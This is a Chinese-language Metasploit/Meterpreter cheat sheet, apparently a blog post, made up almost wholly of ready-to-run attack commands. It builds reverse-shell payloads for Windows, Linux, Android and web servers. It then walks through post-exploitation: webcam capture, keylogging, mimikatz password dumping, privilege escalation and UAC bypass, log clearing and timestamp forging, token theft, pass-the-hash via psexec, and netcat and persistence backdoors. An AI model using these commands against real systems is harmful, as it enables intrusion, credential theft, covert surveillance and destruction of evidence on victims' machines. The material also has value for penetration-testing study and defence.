## 1 | 0 0x00 payload生成：

### 1 | 1 Windows.Linux





```
Windows：
msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -f exe > 保存路径/文件名
Linux:
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -f elf > 保存路径/文件名
```

### 1 | 2 Web





```
PHP:msfvenom -p php/meterpreter_reverse_tcp lhost=[你的IP] lport=[端口] -f raw > 保存路径/文件名.php
ASP:msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口]-f asp > 保存路径/文件名.asp 
JSP: msfvenom -p java/jsp_shell_reverse_tcp lhost=[你的IP] lport=[端口]-f raw > 保存路径/文件名.jsp 
WAR: msfvenom -p java/jsp_shell_reverse_tcp lhost=[你的IP] lport=[端口]-f war > 保存路径/文件名.war
```

### 1 | 3 Android





```
Android：
msfvenom -p android/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -o 保存路径/文件名.apk
```

## 2 | 0 0x01 msfvenom命令参数：





```
 1 Options:
 2     -p, --payload    <payload>  指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&#039;-&#039;或者stdin指定
 3     -l, --list  [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
 4     -n, --nopsled    <length>   为payload预先指定一个NOP滑动长度
 5     -f, --format     <format>   指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
 6     -e, --encoder    [encoder]  指定需要使用的encoder（编码器）
 7     -a, --arch  <architecture>  指定payload的目标架构
 8    --platform   <platform> 指定payload的目标平台
 9     -s, --space <length>   设定有效攻击荷载的最大长度
10     -b, --bad-chars  <list>     设定规避字符集，比如: &#039;x00xff&#039;
11     -i, --iterations <count>    指定payload的编码次数
12     -c, --add-code   <path>     指定一个附加的win32 shellcode文件
13     -x, --template   <path>     指定一个自定义的可执行文件作为模板
14     -k, --keep        保护模板程序的动作，注入的payload作为一个新的进程运行
15    --payload-options  列举payload的标准选项
16     -o, --out   <path>     保存payload
17     -v, --var-name <name>  指定一个自定义的变量，以确定输出格式
18    --shellest    最小化生成payload
19     -h, --help        查看帮助选项
20    --help-formats     查看msf支持的输出格式列表
```

## 3 | 0 0x02 常用系统命令





```
sessions    #sessions –h 查看帮助
sessions -i <ID值>  #进入会话   -k  杀死会话
background  #将当前会话放置后台
run  #执行已有的模块，输入run后按两下tab，列出已有的脚本
info #查看已有模块信息
getuid # 查看权限 
getpid # 获取当前进程的pid
sysinfo # 查看目标机系统信息
ps # 查看当前活跃进程    kill <PID值> 杀死进程
idletime #查看目标机闲置时间
reboot / shutdown   #重启/关机
shell #进入目标机cmd shell
```

### 3 | 1 uictl开关键盘/鼠标





```
uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标
uictl disable mouse  #禁用鼠标
uictl disable keyboard  #禁用键盘
```

### 3 | 2 webcam摄像头命令





```
webcam_list  #查看摄像头
webcam_snap   #通过摄像头拍照
webcam_stream   #通过摄像头开启视频
```

### 3 | 3 execute执行文件





```
execute #在目标机中执行文件
execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互
```

### 3 | 4 migrate进程迁移





```
getpid    # 获取当前进程的pid
ps   # 查看当前活跃进程
migrate <pid值>    #将Meterpreter会话移植到指定pid值进程中
kill <pid值>   #杀死进程
```

### 3 | 5 clearev清除日志





```
clearev  #清除windows中的应用程序日志、系统日志、安全日志
```

## 4 | 0 0x03 文件类命令

### 4 | 1 基本文件系统命令





```
getwd 或者pwd # 查看当前工作目录  
ls
cd
search -f   pass    # 搜索文件  -h查看帮助
cat c:lltestlltestpasswd.txt  # 查看文件内容
upload /tmp/hack.txt C:lltest  # 上传文件到目标机上
download c:lltestlltestpasswd.txt /tmp/ # 下载文件到本机上
edit c:1.txt #编辑或创建文件  没有的话，会新建文件
rm C:lltesthack.txt
mkdir lltest2  #只能在当前目录下创建文件夹
rmdir lltest2  #只能删除当前目录下文件夹
getlwd   或者 lpwd   #操作攻击者主机 查看当前目录
lcd /tmp   #操作攻击者主机 切换目录
```

### 4 | 2 timestomp伪造时间戳





```
timestomp C:// -h   #查看帮助
timestomp -v C://2.txt   #查看时间戳
timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt
```

## 5 | 0 0x04 网络类命令

### 5 | 1 基本网络命令





```
ipconfig/ifconfig
netstat –ano
arp
getproxy   #查看代理信息
route   #查看路由
```

### 5 | 2 portfwd端口转发





```
portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口
```

### 5 | 3 autoroute添加路由





```
run autoroute –h #查看帮助
run autoroute -s 192.168.159.0/24  #添加到目标环境网络
run autoroute –p  #查看添加的路由
```

### 5 | 4 利用arp_scanner、portscan等进行扫描





```
run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24  #扫描192.168.1.0/24这个网段
run auxiliary/scanner/portscan/tcp RHOSTS=192.168.1.144 PORTS=3389 #检测192.168.1.144是否开启3389端口
```

### 5 | 5 Socks4a代理





```
autoroute添加完路由后，还可以利用msf自带的sock4a模块进行Socks4a代理
msf> use auxiliary/server/socks4a 
msf > set srvhost 127.0.0.1
msf > set srvport 1080
msf > run然后vi /etc/proxychains.conf #添加 socks4 127.0.0.1 1080
最后proxychains 使用Socks4a代理访
```

## 6 | 0 0x05 信息收集

### 6 | 1 信息收集的脚本位于：





```
/usr/share/metasploit-framework/modules/post/windows/gather
/usr/share/metasploit-framework/modules/post/linux/gather
```

### 6 | 2 信息收集的脚本较多，仅列几个常用的：





```
run post/windows/gather/checkvm #是否虚拟机
run post/linux/gather/checkvm #是否虚拟机
run post/windows/gather/forensics/enum_drives #查看分区
run post/windows/gather/enum_applications #获取安装软件信息
run post/windows/gather/dumplinks   #获取最近的文件操作
run post/windows/gather/enum_ie  #获取IE缓存
run post/windows/gather/enum_chrome   #获取Chrome缓存
run post/windows/gather/enum_patches  #补丁信息
run post/windows/gather/enum_domain  #查找域控
```

## 7 | 0 0x06 提权

### 7 | 1 getsystem提权





```
getsystem
```

getsystem工作原理：
getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。
getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。
Windows服务已启动，导致与命名管道建立连接。
该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。
然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。

### 7 | 2 bypassuac

内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：





```
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_injection
use windows/local/bypassuac_vbs
use windows/local/ask
```

### 如使用bypassuac.rb脚本：





```
msf > use exploit/windows/local/bypassuac
msf > set SESSION 2
msf > run
```

### 7 | 3 内核漏洞提权

可先利用enum_patches模块 收集补丁信息，然后查找可用的exploits进行提权





```
meterpreter > run post/windows/gather/enum_patches  #查看补丁信息
msf > use exploit/windows/local/ms13_053_schlamperei
msf > set SESSION 2
msf > exploit
```

## 8 | 0 0x07 mimikatz抓取密码





```
load mimikatz    #help mimikatz 查看帮助
wdigest  #获取Wdigest密码
mimikatz_command -f samdump::hashes  #执行mimikatz原始命令
mimikatz_command -f sekurlsa::searchPasswords
```

## 9 | 0 0x08 远程桌面&截屏





```
enumdesktops  #查看可用的桌面
getdesktop    #获取当前meterpreter 关联的桌面
set_desktop   #设置meterpreter关联的桌面  -h查看帮助
screenshot  #截屏
use espia  #或者使用espia模块截屏  然后输入screengrab
run vnc  #使用vnc远程桌面连接
```

## 10 | 0 0x09 开启rdp&添加用户

### 10 | 1 getgui命令





```
run getgui –h #查看帮助
run getgui -e #开启远程桌面
run getgui -u lltest2 -p 123456   #添加用户
run getgui -f 6661 –e   #3389端口转发到6661getgui 系统不推荐，推荐使用run post/windows/manage/enable_rdpgetgui添加用户时，有时虽然可以成功添加用户，但是没有权限通过远程桌面登陆
```

### 10 | 2 enable_rdp脚本





```
run post/windows/manage/enable_rdp  #开启远程桌面
run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662
```

脚本位于/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb
通过enable_rdp.rb脚本可知：开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令

## 11 | 0 0x10 键盘记录





```
keyscan_start  #开始键盘记录
keyscan_dump   #导出记录数据
keyscan_stop #结束键盘记录
```

## 12 | 0 0x11 sniffer抓包





```
use sniffer
sniffer_interfaces   #查看网卡
sniffer_start 2   #选择网卡 开始抓包
sniffer_stats 2   #查看状态
sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包
sniffer_stop 2   #停止抓包
```

## 13 | 0 0x12 注册表操作





```
reg –h
    -d   注册表中值的数据.    -k   注册表键路径    -v   注册表键名称
    enumkey 枚举可获得的键    setval 设置键值    queryval 查询键值数据
```

### 13 | 1 注册表设置nc后门





```
upload /usr/share/windows-binaries/nc.exe C:windowssystem32 #上传nc
reg enumkey -k HKLMsoftwaremicrosoftwindowscurrentversionrun   #枚举run下的key
reg setval -k HKLMsoftwaremicrosoftwindowscurrentversionrun -v lltest_nc -d 'C:windowssystem32nc.exe -Ldp 443 -e cmd.exe' #设置键值
reg queryval -k HKLMsoftwaremicrosoftwindowscurrentversionRun -v lltest_nc   #查看键值

nc -v 192.168.159.144 443  #攻击者连接nc后门
```

## 14 | 0 0x13 令牌操纵

### 14 | 1 incognito假冒令牌





```
use incognito #help incognito  查看帮助
list_tokens -u    #查看可用的token
impersonate_token 'NT AUTHORITYSYSTEM'  #假冒SYSTEM token
或者impersonate_token NT AUTHORITYSYSTEM #不加单引号 需使用
execute -f cmd.exe -i –t    # -t 使用假冒的token 执行
或者直接shell
rev2self   #返回原始token
```

### 14 | 2 steal_token窃取令牌





```
steal_token <pid值>   #从指定进程中窃取token   先ps
drop_token  #删除窃取的token
```

## 15 | 0 0x14 哈希利用

### 15 | 1 获取哈希





```
run post/windows/gather/smart_hashdump  #从SAM导出密码哈希
#需要SYSTEM权限
```

### 15 | 2 PSExec哈希传递

通过smart_hashdump获取用户哈希后，可以利用psexec模块进行哈希传递攻击
前提条件：①开启445端口 smb服务；②开启admin$共享





```
msf > use exploit/windows/smb/psexec
msf > set payload windows/meterpreter/reverse_tcp
msf > set LHOST 192.168.159.134
msf > set LPORT 443
msf > set RHOST 192.168.159.144
msf >set SMBUser Administrator
msf >set SMBPass aad3b4          04ee:5b5f00          c424c
msf >set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain
msf >exploit
```

## 16 | 0 0x15 添加后门维权

### 16 | 1 metasploit自带的后门有两种方式启动的，一种是通过启动项启动(persistence)，一种是通过服务启动(metsvc)，另外还可以通过persistence_exe自定义后门文件。

persistence启动项后门

在C:Users AppDataLocalTemp目录下，上传一个vbs脚本
在注册表HKLMSoftwareMicrosoftWindowsCurrentVersionRun加入开机启动项





```
run persistence –h  #查看帮助
run persistence -X -i 5 -p 6661 -r 192.168.159.134
#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip
```

 连接后门





```
msf > use exploit/multi/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > set LHOST 192.168.159.134
msf > set LPORT 6661
msf > exploit
```

### 16 | 2 metsvc服务后门

在C:Users AppDataLocalTemp上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter





```
run metsvc –h   # 查看帮助
run metsvc –A   #自动安装后门
```

 连接后门





```
msf > use exploit/multi/handler
msf > set payload windows/metsvc_bind_tcp
msf > set RHOST 192.168.159.144
msf > set LPORT 31337
msf > exploit
```


### Refer
http://www.xingher.cn/posts/19d2a2w8.html
